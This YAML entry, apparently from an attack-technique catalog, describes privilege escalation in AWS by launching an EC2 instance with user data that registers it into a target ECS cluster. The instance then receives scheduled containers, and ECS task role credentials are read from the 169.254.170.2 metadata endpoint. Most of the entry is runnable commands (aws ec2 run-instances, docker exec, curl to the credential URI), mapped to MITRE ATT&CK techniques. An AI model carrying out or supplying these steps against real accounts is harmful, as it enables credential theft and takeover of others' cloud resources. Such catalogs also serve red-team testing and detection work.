attack:
  id: AWS-ECS-001
  name: Privilege Escalation via ECS Cluster Registration
  overview: |
    This attack leverages EC2 and ECS permissions to achieve privilege escalation by creating a malicious EC2 instance and registering it within an existing ECS cluster. Once registered, ECS services and tasks are scheduled to run on the attacker-controlled EC2 instance as Docker containers. The attacker can then access these containers, extract their IAM role credentials from the instance metadata service, and assume more privileged ECS task roles to escalate privileges within the AWS environment.
  steps:
    - title: Create Malicious EC2 Instance with ECS Configuration
      command: |
        aws ec2 run-instances \
            --image-id ami-07fde2ae86109a2af \
            --instance-type t2.micro \
            --iam-instance-profile <ECS_role> \
            --count 1 --key-name pwned \
            --user-data "file:///tmp/asd.sh"
        
        # User data script content (/tmp/asd.sh):
        #!/bin/bash
        echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
      dependencies:
        - ec2:RunInstances permission
        - iam:PassRole permission for the ECS instance profile
        - Valid SSH key pair (pwned) in the target region
        - ECS-optimized AMI (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
        - IAM instance profile with basic ECS access permissions
        - Knowledge of target ECS cluster name
      result: |
        A new EC2 instance is launched with the ECS agent pre-configured to register with the target ECS cluster. The instance uses an IAM instance profile that grants it permissions to communicate with ECS services. The user data script automatically configures the instance to join the specified cluster upon boot, making it available to receive ECS task deployments.
      ttp: T1078.004 - Valid Accounts: Cloud Accounts
    - title: Register EC2 Instance to Target ECS Cluster
      command: |
        # Automatic registration occurs via ECS agent on boot
        # Verify registration:
        aws ecs list-container-instances --cluster <cluster-name>
      dependencies:
        - EC2 instance successfully launched from Step 1
        - ECS agent running on the instance
        - Network connectivity between EC2 instance and ECS service endpoints
        - IAM instance profile with ecs:RegisterContainerInstance permission
      result: |
        The malicious EC2 instance successfully registers as a container instance within the target ECS cluster. The ECS scheduler now considers this instance as a valid host for deploying tasks and services. The attacker gains visibility into which containers and services are scheduled on their controlled instance.
      ttp: T1525 - Implant Internal Image
    - title: Extract ECS Task Role Credentials from Running Containers
      command: |
        # SSH into the compromised EC2 instance
        ssh -i pwned.pem ec2-user@<instance-ip>
        
        # List running containers
        docker ps
        
        # Access container and extract credentials
        docker exec -it <container-id> /bin/bash
        
        # Retrieve task role credentials from metadata service
        curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
        
        # Or from the host:
        curl http://169.254.170.2/v2/credentials/<task-role-guid>
      dependencies:
        - SSH access to the compromised EC2 instance
        - ECS tasks/services scheduled on the attacker-controlled instance
        - Docker access on the EC2 instance
        - Network access to ECS task metadata endpoint (169.254.170.2)
      result: |
        The attacker successfully extracts temporary security credentials (AccessKeyId, SecretAccessKey, SessionToken) associated with the IAM roles attached to ECS tasks running on their controlled instance. These credentials typically have elevated permissions for accessing AWS services like S3, DynamoDB, RDS, or other resources that the legitimate application requires. The attacker can now use these credentials to access sensitive data, modify resources, or further escalate privileges within the AWS environment.
      ttp: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
  stride_goal:
    - Elevation of Privilege
    - Information Disclosure